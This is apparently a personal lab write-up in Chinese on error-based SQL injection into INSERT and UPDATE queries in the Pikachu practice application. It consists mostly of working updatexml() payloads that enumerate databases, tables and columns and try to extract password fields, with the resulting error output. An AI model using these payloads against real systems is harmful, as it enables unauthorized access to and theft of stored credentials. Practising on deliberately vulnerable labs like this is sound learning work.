# Pikachu sql (insert/update)注入



### 兩個注入點

* 註冊會員是 insert 注入
* 登入後，修改信息是 update 注入



## insert 注入:

### 猜測:

```
$query = "INSERT INTO member (username, pw, sex, phonenum, email, address)
          VALUES (
      			  '1111',
                  '2222',
                  '3333',
                  '4444',
                  '5555',
                  '6666'
                  )";

```

```
username=1'

//You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '123'),'123','123','123','123')' at line 1
```



* 我原本以為需要()閉合結果不用。





### 注入後的樣子

```
1' AND updatexml(rand(),concat(CHAR(126),version(),CHAR(126)),null) AND '
```

```
$query = "INSERT INTO member (username, pw, sex, phonenum, email, address)
          VALUES (
                  '1' AND updatexml(rand(),concat(CHAR(126),version(),CHAR(126)),null) AND '',
                  '2222',
                  '3333',
                  '4444',
                  '5555',
                  '6666'
                  )";

```

爆出
```
XPATH syntax error: '~5.7.26~'
```


剩下的其他爆破
```
控制 LIMIT找出所有DB

1' AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT 0,1)),null) AND '


1' AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT 8,1)),null) AND '

XPATH syntax error: ':~pikachu~'


----------------------------------------------------------------------------------

獲取pikachu資料庫的表



1' AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),TABLE_NAME,CHAR(126)) FROM information_schema.TABLES WHERE table_schema='pikachu' LIMIT 0,1)),null) AND '



1' AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME='member' LIMIT 1,1)),null) AND '

XPATH syntax error: ':~username~'


1' AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME='member' LIMIT 2,1)),null) AND '

XPATH syntax error: ':~pw~'



----------------------------------------------------------------------



pikachu member表這裡很奇怪，不能獲取資料
1' AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),pw,CHAR(126)) FROM pikachu.member LIMIT 0,1)),null) AND '



users表卻可以
1' AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),password,CHAR(126)) FROM pikachu.users LIMIT 0,1)),null) AND '


我測DVWA 也都可以 唯獨pickachu的member 表怪怪的
```





## update 注入





sex 加個單引號
```
sex=1'&phonenum=111111111111&add=11111111111&email=11111111111&submit=submit

//You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '111111111111',address='11111111111',email='11111111111' where username='asd'' at line 1

```


### 猜測語句:


```
UPDATE member
SET sex = '' and updatexml(null,concat(0x7c,version(),0x7c),null)#  '  ,

    phonenum = '111111111111',
    add = '11111111111',
    email = '11111111111'
WHERE username='asd'
```

 * 因为标准 SQL 不允许在 UPDATE 查询中使用 UNION 来指定更新的条件，所以還是用報錯注入

### 注入後
```
' and updatexml(null,concat(0x7c,version(),0x7c),null)--+
```

```
UPDATE member
SET sex = '' and updatexml(null,concat(0x7c,version(),0x7c),null)--+',
    phonenum = '111111111111',
    add = '11111111111',
    email = '11111111111'
WHERE username='asd'
```

* 這邊有人說and / or 需要根據情況，我自己是覺得 AND 比較好控制

### 我自己測試
```
1' and updatexml.... 可以
0' and updatexml.... 不可以

and 我比較不理解
1 and 0 = 0
0 and 0 =0 為啥不行



1' or updatexml.... 不可以
0' or updatexml.... 可以

OR 我可以理解 一定要有 false 


也許本身整串語法就有問題，不需要知道這麼細
```


### 其他操作
```
----------------------------------------------------------------------
慢慢控制 limit 獲取所有數據庫名

1' and updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT 0,1)),null)--+
1' and updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT 1,1)),null)--+
1' and updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT 2,1)),null)--+
...
sex=1' and updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT 8,1)),null)--+


XPATH syntax error: ':~pikachu~'

----------------------------------------------------------------------



----------------------------------------------------------------------
獲取pikachu資料庫的表
1' AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),TABLE_NAME,CHAR(126)) FROM information_schema.TABLES WHERE table_schema='pikachu' LIMIT 0,1)),null)--+

1' AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),TABLE_NAME,CHAR(126)) FROM information_schema.TABLES WHERE table_schema='pikachu' LIMIT 1,1)),null)--+

XPATH syntax error: ':~member~'



----------------------------------------------------------------------
獲取欄位
1' AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME='member' LIMIT 0,1)),null)--+




1' AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME='member' LIMIT 1,1)),null)--+

XPATH syntax error: ':~username~'


1' AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME='member' LIMIT 2,1)),null)--+

XPATH syntax error: ':~pw~'

----------------------------------------------------------------------

花了我一小時完全沒答案


member表這裡很奇怪，不能獲取資料
1' AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),pw,CHAR(126)) FROM pikachu.member LIMIT 0,1)),null)--+

出現錯誤
You can't specify target table 'member' for update in FROM clause


users表卻可以
1' AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),password,CHAR(126)) FROM pikachu.users LIMIT 0,1)),null)--+


我測DVWA 也都可以 唯獨pickachu的member 表怪怪的
```